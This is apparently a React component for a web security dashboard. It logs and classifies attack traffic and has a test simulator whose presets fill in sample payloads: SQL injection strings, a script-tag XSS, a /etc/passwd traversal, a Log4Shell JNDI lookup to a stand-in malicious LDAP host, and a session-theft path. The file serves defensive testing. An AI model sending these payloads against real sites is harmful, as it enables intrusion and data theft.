import React, { useEffect, useState } from 'react';
import { ShieldAlert, Terminal, RefreshCw, AlertTriangle, Globe, MapPin, Database, Server, CheckCircle2, XCircle } from 'lucide-react';
import RiskBadge from '../components/RiskBadge';
import { api } from '../services/api';
import { useLanguage } from '../context/LanguageContext';

export default function SiteMonitoring() {
  const { lang } = useLanguage();
  const [events, setEvents] = useState([]);
  const [loading, setLoading] = useState(false);
  const [auditLoading, setAuditLoading] = useState(false);

  // Domain Audit State
  const [auditDomainInput, setAuditDomainInput] = useState('authorized-store.com');
  const [auditResult, setAuditResult] = useState(null);

  // Manual Log Form State
  const [domain, setDomain] = useState('authorized-store.com');
  const [ip, setIp] = useState('185.220.101.5');
  const [method, setMethod] = useState('POST');
  const [path, setPath] = useState('/login');
  const [payload, setPayload] = useState("username=admin' OR '1'='1&password=123");
  const [status, setStatus] = useState(401);
  const [ua, setUa] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64)');

  const fetchEvents = async () => {
    setLoading(true);
    try {
      const res = await api.getSecurityEvents(30);
      setEvents(res.data);
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchEvents();
  }, []);

  const handleSeedLogs = async () => {
    setLoading(true);
    try {
      await api.seedDemoLogs();
      await fetchEvents();
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const handleDomainAudit = async (e) => {
    e?.preventDefault();
    if (!auditDomainInput) return;
    setAuditLoading(true);
    try {
      const res = await api.auditDomain(auditDomainInput);
      setAuditResult(res.data);
    } catch (err) {
      console.error(err);
    } finally {
      setAuditLoading(false);
    }
  };

  const handleIngest = async (e) => {
    e?.preventDefault();
    setLoading(true);
    try {
      await api.ingestLog({
        website_domain: domain,
        source_ip: ip,
        http_method: method,
        request_path: path,
        status_code: parseInt(status),
        user_agent: ua,
        payload: payload
      });
      fetchEvents();
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const setAttackPreset = (type) => {
    if (type === 'SQLi') {
      setMethod('POST');
      setPath('/login');
      setPayload("username=admin' UNION SELECT 1,2,schema_name FROM information_schema.schemata--");
      setIp('185.220.101.5');
    } else if (type === 'XSS') {
      setMethod('GET');
      setPath("/search?q=<script>alert('XSS-Pwned')</script>");
      setPayload('');
      setIp('45.142.120.10');
    } else if (type === 'Traversal') {
      setMethod('GET');
      setPath('/download?file=../../../../etc/passwd');
      setPayload('');
      setIp('185.220.101.5');
    } else if (type === 'Malware') {
      setMethod('GET');
      setPath('/uploads/invoice_update.exe.crypto');
      setPayload('payload.bin');
      setIp('45.142.120.10');
    } else if (type === 'ZeroDay') {
      setMethod('POST');
      setPath('/api/v1/user');
      setPayload('${jndi:ldap://malicious-log4j-server.com/a}');
      setIp('104.28.19.44');
    } else if (type === 'SessionHijack') {
      setMethod('GET');
      setPath('/auth/verify?session_id=PHPSESSID=steal_token_9482');
      setPayload('');
      setIp('185.220.101.5');
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
            <ShieldAlert className="w-5 h-5 text-cyan-400" /> Web Security Log & Cyber Threat Intelligence
          </h2>
          <p className="text-xs text-slate-400">Real-time WAF telemetry, IP Geolocation, ASN Tracing, Threat Intelligence & Attack Vector Classifier</p>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={handleSeedLogs}
            disabled={loading}
            className="p-2 rounded-lg bg-cyan-950/60 border border-cyan-500/30 text-cyan-300 hover:text-white transition flex items-center gap-2 text-xs font-semibold"
          >
            <Database className="w-3.5 h-3.5" /> Seed Prototype Logs
          </button>
          <button
            onClick={fetchEvents}
            className="p-2 rounded-lg bg-slate-900 border border-slate-800 text-slate-300 hover:text-white transition flex items-center gap-2 text-xs"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} /> Refresh Telemetry
          </button>
        </div>
      </div>

      {/* Domain Security & IP Geolocation Audit Card */}
      <div className="glass-card p-5 rounded-xl border border-slate-800 space-y-4">
        <div className="flex items-center justify-between flex-wrap gap-2">
          <h3 className="font-semibold text-white text-sm flex items-center gap-2">
            <Globe className="w-4 h-4 text-cyan-400" /> Site Threat & IP Location Audit
          </h3>
          <span className="text-[10px] text-slate-400 bg-slate-900 px-2 py-0.5 rounded border border-slate-800">
            Threat Intelligence & Network Location Tracing
          </span>
        </div>

        <form onSubmit={handleDomainAudit} className="flex gap-2">
          <input
            type="text"
            placeholder="Enter authorized domain (e.g., authorized-store.com)"
            value={auditDomainInput}
            onChange={(e) => setAuditDomainInput(e.target.value)}
            className="flex-1 bg-slate-900 border border-slate-700 rounded p-2 text-white font-mono text-xs"
          />
          <button
            type="submit"
            disabled={auditLoading}
            className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-cyan-500/30 font-semibold rounded text-xs transition flex items-center gap-1.5"
          >
            {auditLoading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <MapPin className="w-3.5 h-3.5" />} Run Site & Location Audit
          </button>
        </form>

        {auditResult && (
          <div className="mt-4 p-4 rounded-lg bg-slate-900/80 border border-slate-800 space-y-4 text-xs">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 border-b border-slate-800 pb-3">
              <div>
                <span className="text-slate-400 block text-[10px] uppercase">Target Domain</span>
                <span className="font-mono text-cyan-400 font-bold">{auditResult.domain}</span>
              </div>
              <div>
                <span className="text-slate-400 block text-[10px] uppercase">Total Attacks Logged</span>
                <span className="font-mono text-white font-bold">{auditResult.total_attacks_logged} Events</span>
              </div>
              <div>
                <span className="text-slate-400 block text-[10px] uppercase">VirusTotal Reputation</span>
                <span className="font-mono text-amber-400 font-bold">
                  {auditResult.virustotal?.malicious > 0 ? `${auditResult.virustotal.malicious} Engines Flagged` : 'Clean / 0 Detections'}
                </span>
              </div>
            </div>

            {/* Traced Attackers & GeoIP */}
            <div>
              <h4 className="font-semibold text-slate-300 mb-2 flex items-center gap-1.5">
                <MapPin className="w-3.5 h-3.5 text-cyan-400" /> Traced Network Locations & ASN Intelligence
              </h4>
              {auditResult.traced_attackers && auditResult.traced_attackers.length > 0 ? (
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
                  {auditResult.traced_attackers.slice(0, 6).map((atk, idx) => (
                    <div key={idx} className="p-2.5 rounded bg-slate-950/60 border border-slate-800 font-mono text-[11px] space-y-1">
                      <div className="flex items-center justify-between">
                        <span className="text-cyan-300 font-bold">{atk.ip}</span>
                        {atk.is_vpn_proxy && (
                          <span className="text-[9px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30">
                            VPN/TOR
                          </span>
                        )}
                      </div>
                      <p className="text-slate-300 font-sans text-[10px]">
                        📍 {atk.city}, {atk.country}
                      </p>
                      <p className="text-slate-500 text-[9px] truncate">🌐 {atk.asn}</p>
                      <div className="pt-1 flex items-center justify-between text-[10px]">
                        <span className="text-slate-400">{atk.attack}</span>
                        <RiskBadge level={atk.severity} />
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-slate-500 italic text-[11px]">No attacks logged for this domain yet. Ingest log events below to populate telemetry.</p>
              )}
            </div>

            {/* Legal Attribution Disclaimer */}
            <div className="p-2.5 rounded bg-blue-950/30 border border-blue-500/30 text-[10px] text-slate-300 flex items-start gap-2 font-sans">
              <AlertTriangle className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
              <div>
                <strong className="text-blue-300 block mb-0.5">{lang === 'fr' ? 'Avis de Localisation Réseau Apparente (Référence Jury)' : 'Apparent Network Location Disclaimer (Jury Reference)'}</strong>
                {lang === 'en' 
                  ? (auditResult.disclaimer_en || auditResult.disclaimer?.replace(/⚠️\s*Attention\s*:\s*IP provenant d'un proxy, nœud VPN\/Tor ou ASN bulletproof\./gi, '⚠️ Warning: IP originating from a proxy, VPN/Tor node, or bulletproof ASN.').replace(/📍\s*Localisation estimée basée sur le registre ASN\./gi, '📍 Estimated location based on ASN registry.'))
                  : auditResult.disclaimer}
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Log Ingest Form */}
      <div className="glass-card p-5 rounded-xl border border-slate-800 space-y-4">
        <div className="flex items-center justify-between flex-wrap gap-2">
          <h3 className="font-semibold text-white text-sm flex items-center gap-2">
            <Terminal className="w-4 h-4 text-cyan-400" /> Test Log Ingestion & Attack Simulator
          </h3>
          <div className="flex flex-wrap gap-1.5 font-mono text-[10px]">
            <button type="button" onClick={() => setAttackPreset('SQLi')} className="px-2 py-1 rounded bg-red-500/20 text-red-400 border border-red-500/30 hover:bg-red-500/30">
              Preset: SQLi
            </button>
            <button type="button" onClick={() => setAttackPreset('XSS')} className="px-2 py-1 rounded bg-amber-500/20 text-amber-400 border border-amber-500/30 hover:bg-amber-500/30">
              Preset: XSS
            </button>
            <button type="button" onClick={() => setAttackPreset('Traversal')} className="px-2 py-1 rounded bg-purple-500/20 text-purple-400 border border-purple-500/30 hover:bg-purple-500/30">
              Preset: LFI Traversal
            </button>
            <button type="button" onClick={() => setAttackPreset('Malware')} className="px-2 py-1 rounded bg-rose-500/20 text-rose-400 border border-rose-500/30 hover:bg-rose-500/30 font-bold">
              Preset: Malware Drop
            </button>
            <button type="button" onClick={() => setAttackPreset('ZeroDay')} className="px-2 py-1 rounded bg-red-600/30 text-red-300 border border-red-500/50 hover:bg-red-600/40 font-bold">
              Preset: Zero-Day RCE
            </button>
            <button type="button" onClick={() => setAttackPreset('SessionHijack')} className="px-2 py-1 rounded bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 hover:bg-cyan-500/30">
              Preset: Session Theft
            </button>
          </div>
        </div>

        <form onSubmit={handleIngest} className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 text-xs">
          <div>
            <label className="block text-slate-400 mb-1">Target Website Domain</label>
            <input
              type="text"
              value={domain}
              onChange={(e) => setDomain(e.target.value)}
              className="w-full bg-slate-900 border border-slate-700 rounded p-2 text-white font-mono"
            />
          </div>
          <div>
            <label className="block text-slate-400 mb-1">Source IP Address</label>
            <input
              type="text"
              value={ip}
              onChange={(e) => setIp(e.target.value)}
              className="w-full bg-slate-900 border border-slate-700 rounded p-2 text-white font-mono"
            />
          </div>
          <div>
            <label className="block text-slate-400 mb-1">HTTP Method & Status</label>
            <div className="flex gap-2">
              <select value={method} onChange={(e) => setMethod(e.target.value)} className="bg-slate-900 border border-slate-700 rounded p-2 text-white font-mono w-1/2">
                <option>GET</option>
                <option>POST</option>
                <option>PUT</option>
                <option>DELETE</option>
              </select>
              <input
                type="number"
                value={status}
                onChange={(e) => setStatus(e.target.value)}
                className="w-1/2 bg-slate-900 border border-slate-700 rounded p-2 text-white font-mono"
              />
            </div>
          </div>
          <div>
            <label className="block text-slate-400 mb-1">Request Path</label>
            <input
              type="text"
              value={path}
              onChange={(e) => setPath(e.target.value)}
              className="w-full bg-slate-900 border border-slate-700 rounded p-2 text-white font-mono"
            />
          </div>
          <div className="sm:col-span-2 lg:col-span-3">
            <label className="block text-slate-400 mb-1">POST Body Payload / Query String</label>
            <input
              type="text"
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              className="w-full bg-slate-900 border border-slate-700 rounded p-2 text-white font-mono"
            />
          </div>
          <div className="flex items-end">
            <button
              type="submit"
              disabled={loading}
              className="w-full py-2 bg-gradient-to-r from-cyan-500 to-blue-600 text-black font-semibold rounded transition shadow-lg shadow-cyan-500/20 hover:opacity-90"
            >
              Submit & Classify Log
            </button>
          </div>
        </form>
      </div>

      {/* Log Feed Table */}
      <div className="glass-card p-5 rounded-xl border border-slate-800 space-y-4">
        <h3 className="font-semibold text-white text-sm flex items-center justify-between">
          <span>Security Event Telemetry Feed</span>
          <span className="text-[10px] text-slate-400 font-mono font-normal">Showing last {events.length} events</span>
        </h3>
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs">
            <thead className="bg-slate-900 text-slate-400 uppercase font-mono text-[10px]">
              <tr>
                <th className="py-2.5 px-3">Timestamp</th>
                <th className="py-2.5 px-3">Classification</th>
                <th className="py-2.5 px-3">Request Details</th>
                <th className="py-2.5 px-3">Source IP & Location Tracing</th>
                <th className="py-2.5 px-3">Severity</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60 font-mono text-slate-300">
              {events.length === 0 ? (
                <tr>
                  <td colSpan="5" className="py-6 text-center text-slate-500 font-sans">
                    No log events recorded. Click <strong>"Seed Prototype Logs"</strong> above to populate test data.
                  </td>
                </tr>
              ) : (
                events.map((e) => (
                  <tr key={e.id} className="hover:bg-slate-900/40 transition">
                    <td className="py-3 px-3 text-slate-400 text-[11px] whitespace-nowrap">
                      {new Date(e.timestamp).toLocaleTimeString()}
                    </td>
                    <td className="py-3 px-3 font-semibold text-white">
                      {e.attack_type}
                    </td>
                    <td className="py-3 px-3 max-w-[280px]">
                      <span className="text-cyan-400 font-bold">{e.http_method}</span> {e.request_path}
                      {e.evidence_payload && e.evidence_payload !== e.request_path && (
                        <p className="text-[10px] text-slate-500 truncate mt-0.5">{e.evidence_payload}</p>
                      )}
                    </td>
                    <td className="py-3 px-3">
                      <div className="flex items-center gap-1.5">
                        <span className="text-slate-200 font-bold">{e.source_ip}</span>
                        {e.ip_geo_info?.is_vpn_proxy && (
                          <span className="text-[9px] px-1 py-0.2 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30 font-sans">
                            PROXY/VPN
                          </span>
                        )}
                      </div>
                      <p className="text-[10px] text-slate-400 font-sans flex items-center gap-1 mt-0.5">
                        📍 {e.ip_geo_info?.city || 'Unknown'}, {e.ip_geo_info?.country || 'Unknown'} • <span className="text-slate-500 font-mono">{e.ip_geo_info?.asn ? e.ip_geo_info.asn.split(' ')[0] : 'ASN'}</span>
                      </p>
                    </td>
                    <td className="py-3 px-3">
                      <RiskBadge level={e.severity} />
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
